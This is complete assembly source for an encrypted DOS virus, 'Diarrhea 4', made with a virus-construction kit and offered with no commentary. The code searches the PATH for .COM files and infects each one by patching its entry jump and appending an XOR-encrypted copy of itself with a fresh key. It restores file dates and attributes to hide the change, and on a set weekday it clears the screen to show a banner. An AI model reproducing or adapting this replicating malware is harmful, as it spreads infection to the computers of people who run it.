; DIARRHE4.ASM -- DIARRHEA 4
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by URNST KOUCH

virus_type      equ     0                       ; Appending Virus
is_encrypted    equ     1                       ; We're encrypted
tsr_virus       equ     0                       ; We're not TSR

code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

main            proc    near
		db      0E9h,00h,00h            ; Near jump (for compatibility)
start:          call    find_offset             ; Like a PUSH IP
find_offset:    pop     bp                      ; BP holds old IP
		sub     bp,offset find_offset   ; Adjust for length of host

		call    encrypt_decrypt         ; Decrypt the virus

start_of_code   label   near

		lea     si,[bp + buffer]        ; SI points to original start
		mov     di,0100h                ; Push 0100h on to stack for
		push    di                      ; return to main program
		movsw                           ; Copy the first two bytes
		movsb                           ; Copy the third byte

		mov     di,bp                   ; DI points to start of virus

		mov     bp,sp                   ; BP points to stack
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer on stack
		int     021h

		call    get_weekday
		cmp     ax,0005h                ; Did the function return 5?
		je      strt00                  ; If equal, do effect
		jmp     end00                   ; Otherwise skip over it
strt00:         lea     si,[di + data00]        ; SI points to data
		mov     cx,0107h                ; Second argument is 263
		push    di                      ; Save DI
		push    es                      ; Save ES

		jcxz    uncrunch_done           ; Exit if there are no characters

		mov     ah,0Fh                  ; BIOS get screen mode function
		int     10h
		xor     ah,ah                   ; BIOS set screen mode function
		int     10h                     ; Clear the screen

		xor     di,di
		mov     ax,0B800h               ; AX is set to video segment
		mov     es,ax                   ; ES holds video segment

		mov     dx,di                   ; Save X coordinate for later
		xor     ax,ax                   ; Set current attributes
		cld

loopa:          lodsb                           ; Get next character
		cmp     al,32                   ; Is it a control character?
		jb      foreground              ; Handle it if it is
		stosw                           ; Save letter on screen
next:           loop    loopa                   ; Repeat until we're done
		jmp     short uncrunch_done     ; Leave this routine

foreground:     cmp     al,16                   ; Are we changing the foreground?
		jnb     background              ; If not, check the background
		and     ah,0F0h                 ; Strip off old foreground
		or      ah,al                   ; Put the new one on
		jmp     short next              ; Resume looping

background:     cmp     al,24                   ; Are we changing the background?
		je      next_line               ; If AL = 24, go to next line
		jnb     flash_bit_toggle        ; If AL > 24 set the flash bit
		sub     al,16                   ; Change AL to a color number
		add     al,al                   ; Crude way of shifting left
		add     al,al                   ; four bits without changing
		add     al,al                   ; CL or wasting space.  Ok,
		add     al,al                   ; I guess.
		and     al,08Fh                 ; Strip off old background
		or      ah,al                   ; Put the new one on
		jmp     short next              ; Resume looping

next_line:      add     dx,160                  ; Skip a whole line (80 chars.
		mov     di,dx                   ; AND 80 attribs.)
		jmp     short next              ; Resume looping

flash_bit_toggle: cmp   al,27                   ; Is it a blink toggle?
		jb      multi_output            ; If AL < 27, it's a blinker
		jne     next                    ; Otherwise resume looping
		xor     ah,128                  ; Toggle the flash bit
		jmp     short next              ; Resume looping

multi_output:   cmp     al,25                   ; Set Zero flag if multi-space
		mov     bx,cx                   ; Save main counter
		lodsb                           ; Get number of repititions
		mov     cl,al                   ; Put it in CL
		mov     al,' '                  ; AL holds a space
		jz      start_output            ; If displaying spaces, jump
		lodsb                           ; Otherwise get character to use
		dec     bx                      ; Adjust main counter

start_output:   xor     ch,ch                   ; Clear CH
		inc     cx                      ; Add one to count
	rep     stosw                           ; Display the character
		mov     cx,bx                   ; Restore main counter
		dec     cx                      ; Adjust main counter
		loopnz  loopa                   ; Resume looping if not done

uncrunch_done:  pop     es                      ; Restore ES
		pop     di                      ; Restore DI

end00:          call    search_files            ; Find and infect a file


com_end:        pop     dx                      ; DX holds original DTA address
		mov     ah,01Ah                 ; DOS set DTA function
		int     021h

		mov     sp,bp                   ; Deallocate local buffer

		xor     ax,ax                   ;
		mov     bx,ax                   ;
		mov     cx,ax                   ;
		mov     dx,ax                   ; Empty out the registers
		mov     si,ax                   ;
		mov     di,ax                   ;
		mov     bp,ax                   ;

		ret                             ; Return to original program
main            endp

search_files    proc    near
		mov     bx,di                   ; BX points to the virus
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,135                  ; Allocate 135 bytes on stack

		mov     byte ptr [bp - 135],'\' ; Start with a backslash

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 134]           ; SI points to 64-byte buffer
		int     021h

		call    traverse_path           ; Start the traversal

traversal_loop: cmp     word ptr [bx + path_ad],0       ; Was the search unsuccessful?
		je      done_searching          ; If so then we're done
		call    found_subdir            ; Otherwise copy the subdirectory

		mov     ax,cs                   ; AX holds the code segment
		mov     ds,ax                   ; Set the data and extra
		mov     es,ax                   ; segments to the code segment

		xor     al,al                   ; Zero AL
		stosb                           ; NULL-terminate the directory

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 70]            ; DX points to the directory
		int     021h

		lea     dx,[bx + com_mask]      ; DX points to "*.COM"
		push    di
		mov     di,bx
		call    find_files              ; Try to infect a .COM file
		mov     bx,di
		pop     di
		jnc     done_searching          ; If successful the exit
		jmp     short traversal_loop    ; Keep checking the PATH

done_searching: mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 135]           ; DX points to old directory
		int     021h

		cmp     word ptr [bx + path_ad],0       ; Did we run out of directories?
		jne     at_least_tried          ; If not then exit
		stc                             ; Set the carry flag for failure
at_least_tried: mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller
com_mask        db      "*.COM",0               ; Mask for all .COM files
search_files    endp

traverse_path   proc    near
		mov     es,word ptr cs:[002Ch]  ; ES holds the enviroment segment
		xor     di,di                   ; DI holds the starting offset

find_path:      lea     si,[bx + path_string]   ; SI points to "PATH="
		lodsb                           ; Load the "P" into AL
		mov     cx,08000h               ; Check the first 32767 bytes
	repne   scasb                           ; Search until the byte is found
		mov     cx,4                    ; Check the next four bytes
check_next_4:   lodsb                           ; Load the next letter of "PATH="
		scasb                           ; Compare it to the environment
		jne     find_path               ; If there not equal try again
		loop    check_next_4            ; Otherwise keep checking

		mov     word ptr [bx + path_ad],di      ; Save the PATH address
		mov     word ptr [bx + path_ad + 2],es  ; Save the PATH's segment
		ret                             ; Return to caller

path_string     db      "PATH="                 ; The PATH string to search for
path_ad         dd      ?                       ; Holds the PATH's address
traverse_path   endp

found_subdir    proc    near
		lds     si,dword ptr [bx + path_ad]     ; DS:SI points to PATH
		lea     di,[bp - 70]            ; DI points to the work buffer
		push    cs                      ; Transfer CS into ES for
		pop     es                      ; byte transfer
move_subdir:    lodsb                           ; Load the next byte into AL
		cmp     al,';'                  ; Have we reached a separator?
		je      moved_one               ; If so we're done copying
		or      al,al                   ; Are we finished with the PATH?
		je      moved_last_one          ; If so get out of here
		stosb                           ; Store the byte at ES:DI
		jmp     short move_subdir       ; Keep transfering characters

moved_last_one: xor     si,si                   ; Zero SI to signal completion
moved_one:      mov     word ptr es:[bx + path_ad],si  ; Store SI in the path address
		ret                             ; Return to caller
found_subdir    endp

find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx,00100111b            ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     si,bx                   ; SI points to the DTA

		mov     byte ptr [di + set_carry],0  ; Assume we'll fail

		cmp     word ptr [si + 01Ah],(65279 - (finish - start))
		jbe     size_ok                 ; If it's small enough continue
		jmp     infection_done          ; Otherwise exit

size_ok:        mov     ax,03D00h               ; DOS open file function, r/o
		lea     dx,[si + 01Eh]          ; DX points to file name
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,03Fh                 ; DOS read from file function
		mov     cx,3                    ; CX holds bytes to read (3)
		lea     dx,[di + buffer]        ; DX points to buffer
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		xchg    dx,ax                   ; Faster than a PUSH AX
		mov     ah,03Eh                 ; DOS close file function
		int     021h
		xchg    dx,ax                   ; Faster than a POP AX

		sub     ax,finish - start + 3   ; Adjust AX for a valid jump
		cmp     word ptr [di + buffer + 1],ax  ; Is there a JMP yet?
		je      infection_done          ; If equal then exit
		mov     byte ptr [di + set_carry],1  ; Success -- the file is OK
		add     ax,finish - start       ; Re-adjust to make the jump
		mov     word ptr [di + new_jump + 1],ax  ; Construct jump

		mov     ax,04301h               ; DOS set file attrib. function
		xor     cx,cx                   ; Clear all attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

		mov     ax,03D02h               ; DOS open file function, r/w
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		mov     ah,040h                 ; DOS write to file function
		mov     cx,3                    ; CX holds bytes to write (3)
		lea     dx,[di + new_jump]      ; DX points to the jump we made
		int     021h

		mov     ax,04202h               ; DOS file seek function, EOF
		cwd                             ; Zero DX _ Zero bytes from end
		mov     cx,dx                   ; Zero CX /
		int     021h

		push    si                      ; Save SI through call
		call    encrypt_code            ; Write an encrypted copy
		pop     si                      ; Restore SI

		mov     ax,05701h               ; DOS set file time function
		mov     cx,[si + 016h]          ; CX holds old file time
		mov     dx,[si + 018h]          ; DX holds old file date
		int     021h

		mov     ah,03Eh                 ; DOS close file function
		int     021h

		mov     ax,04301h               ; DOS set file attrib. function
		xor     ch,ch                   ; Clear CH for file attribute
		mov     cl,[si + 015h]          ; CX holds file's old attributes
		lea     dx,[si + 01Eh]          ; DX points to victim's name
		int     021h

infection_done: cmp     byte ptr [di + set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

set_carry       db      ?                       ; Set-carry-on-exit flag
buffer          db      090h,0CDh,020h          ; Buffer to hold old three bytes
new_jump        db      0E9h,?,?                ; New jump to virus
infect_file     endp


get_weekday     proc    near
		mov     ah,02Ah                 ; DOS get date function
		int     021h
		cbw                             ; Sign-extend AL into AX
		ret                             ; Return to caller
get_weekday     endp

data00          DB      15,16,24,24,24,24,24,24,25,3,12,'ÒÄÄ¿ ÖÄÄ¿ ÖÄÒÄ¿  ÖÄ'
		DB      'ÒÄ¿ Ò  Â  ÒÄÄ¿ ÄÒÄ ÖÄÄ¿ ÒÄÄ¿ ÒÄÄ¿ Ò  Â ÒÄÄ¿ ÖÄÄ¿ Ò',24
		DB      25,3,'ÇÄ',25,2,'ÇÄÄ´',25,2,'º',25,3,'º º ³ ÓÄÄ´  º  '
		DB      '³  º  ÇÄÄ´ ÇÄÂÙ ÇÄÂÙ ÇÄÄ´ ÇÄ',25,2,'ÇÄÄ´ º',24,25,3,'Ð'
		DB      'ÄÄÙ Ð  Á',25,2,'Ð',25,3,'Ð Ð Á ÓÄÄÙ  ÐÄÄÙ ÄÐÄ Ð  Á '
		DB      'Ð Á  Ð Á  Ð  Á ÐÄÄÙ Ð  Á o',24,25,19,14,'-GG Allin '
		DB      '& The Texas Nazis',24,24,24,24,24,24,24,24,24,24,24,24
		DB      24,24,24,24

vcl_marker      db      "[VCL]",0               ; VCL creation marker

encrypt_code    proc    near
		push    bp                      ; Save BP
		mov     bp,di                   ; Use BP as pointer to code
		lea     si,[bp + encrypt_decrypt]; SI points to cipher routine

		xor     ah,ah                   ; BIOS get time function
		int     01Ah
		mov     word ptr [si + 9],dx    ; Low word of timer is new key

		xor     byte ptr [si + 1],8     ;
		xor     byte ptr [si + 8],1     ; Change all SIs to DIs
		xor     word ptr [si + 11],0101h; (and vice-versa)

		lea     di,[bp + finish]        ; Copy routine into heap
		mov     cx,finish - encrypt_decrypt - 1  ; All but final RET
		push    si                      ; Save SI for later
		push    cx                      ; Save CX for later
	rep     movsb                           ; Copy the bytes

		lea     si,[bp + write_stuff]   ; SI points to write stuff
		mov     cx,5                    ; CX holds length of write
	rep     movsb                           ; Copy the bytes

		pop     cx                      ; Restore CX
		pop     si                      ; Restore SI
		inc     cx                      ; Copy the RET also this time
	rep     movsb                           ; Copy the routine again

		mov     ah,040h                 ; DOS write to file function
		lea     dx,[bp + start]         ; DX points to virus

		lea     si,[bp + finish]        ; SI points to routine
		call    si                      ; Encrypt/write/decrypt

		mov     di,bp                   ; DI points to virus again
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

write_stuff:    mov     cx,finish - start       ; Length of code
		int     021h
encrypt_code    endp

end_of_code     label   near

encrypt_decrypt proc    near
		lea     si,[bp + start_of_code] ; SI points to code to decrypt
		mov     cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:       db      081h,034h,00h,00h       ; XOR a word by the key
		inc     si                      ; Do the next word
		inc     si                      ;
		loop    xor_loop                ; Loop until we're through
		ret                             ; Return to caller
encrypt_decrypt endp
finish          label   near

code            ends
		end     main
